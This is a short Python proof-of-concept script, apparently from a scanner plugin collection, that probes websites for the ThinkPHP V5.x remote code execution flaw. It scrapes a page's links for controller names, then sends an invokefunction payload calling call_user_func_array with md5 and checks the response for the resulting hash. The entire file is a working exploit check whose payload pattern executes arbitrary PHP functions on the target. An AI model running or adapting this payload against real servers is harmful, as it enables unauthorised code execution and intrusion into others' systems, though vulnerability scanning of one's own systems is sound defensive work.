#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: ThinkPHP V5代码执行漏洞
referer: https://iaq.pw/archives/106
author: Lucifer
description: ThinkPHP V5.x代码执行漏洞
'''
import re
import sys
import requests
import warnings




def extract_controller(url):
    urls = list()
    req = requests.get(url, timeout=10, verify=False)
    pattern = '<a[\\s+]href="/[A-Za-z]+'
    matches = re.findall(pattern, req.text)
    for match in matches:
        urls.append(match.split('/')[1])
    urls = list(set(urls))
    urls.append('index')
    return urls

def poc(url):
    controllers = extract_controller(url)
    for controller in controllers:
        payload = "/?s={}/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=123".format(controller)
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)
            if r"202cb962ac59075b964b07152d234b70" in req.text:
                # print("[+]存在ThinkPHP 代码执行漏洞...(高危)\tpayload: "+vulnurl)
                return {'payload': vulnurl, 'post_data': '', 'info': '', 'extra': ''}
            else:
                pass

        except:
            pass

